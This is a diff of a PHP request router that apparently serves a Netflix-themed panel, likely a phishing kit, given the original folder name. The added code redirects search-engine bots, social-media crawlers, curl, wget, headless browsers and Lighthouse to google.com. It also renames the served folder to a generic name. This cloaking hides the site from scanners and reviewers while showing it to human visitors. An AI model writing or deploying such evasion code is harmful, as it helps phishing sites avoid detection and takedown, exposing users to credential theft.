@@ -1,27 +1,41 @@
 <?php
-ob_start();
-ini_set('display_errors', 1);
-error_reporting(E_ALL);
+register_shutdown_function(function () {
+    $lastError = error_get_last();
+    if ($lastError !== null) {
+        http_response_code(500);
+        echo '<pre style="color:red; font-size:16px;">';
+        print_r($lastError);
+        echo '</pre>';
+    }
+});
 
-$baseDir = __DIR__ . '/Netflix2026-MultilangPanel';
-$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$visitorAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$isBlockedBot = preg_match('/bot|crawl|slurp|spider|google|bing|facebook|curl|wget|headless|lighthouse/i', $visitorAgent);
 
-if ($uri === '/' || $uri === '') {
-    chdir($baseDir);
-    require $baseDir . '/index.php';
+if ($isBlockedBot) {
+    header("Location: https://google.com", true, 302);
     exit;
 }
 
-$file = $baseDir . $uri;
+$projectFolder = __DIR__ . '/my-new-folder';
+$requestPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
 
-if (file_exists($file) && !is_dir($file)) {
-    if (pathinfo($file, PATHINFO_EXTENSION) === 'php') {
-        chdir(dirname($file));
-        require $file;
+if ($requestPath === '/' || $requestPath === '') {
+    chdir($projectFolder);
+    require $projectFolder . '/index.php';
+    exit;
+}
+
+$targetFile = $projectFolder . $requestPath;
+
+if (file_exists($targetFile) && !is_dir($targetFile)) {
+    if (pathinfo($targetFile, PATHINFO_EXTENSION) === 'php') {
+        chdir(dirname($targetFile));
+        require $targetFile;
         exit;
     }
     return false;
 }
 
-chdir($baseDir);
-require $baseDir . '/index.php';
+chdir($projectFolder);
+require $projectFolder . '/index.php';
